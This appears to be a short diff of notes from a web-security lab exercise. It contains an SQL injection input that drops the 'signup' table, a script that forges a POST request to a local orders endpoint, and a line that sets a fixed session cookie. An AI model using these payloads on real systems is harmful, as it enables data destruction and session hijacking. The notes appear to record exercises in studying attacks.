@@ -90,3 +90,17 @@ INSERT INTO signup (address, name) VALUES ('testijuttu', 'moikka')
 INSERT INTO signup (address, name) VALUES ('testijuttu', '
 moikka') ; DROP TABLE signup; --
 ')
+
+
+
+<script>
+fetch("http://localhost:8080/orders", {
+method: 'POST',
+headers: new Headers({
+'Content-Type': 'application/x-www-form-urlencoded'
+}),
+body: "name=Hakkeri&address=Bittikatu 2"})
+</script>
+
+
+document.cookie="JSESSIONID=12EE43AF515F83867B20D94907108063"
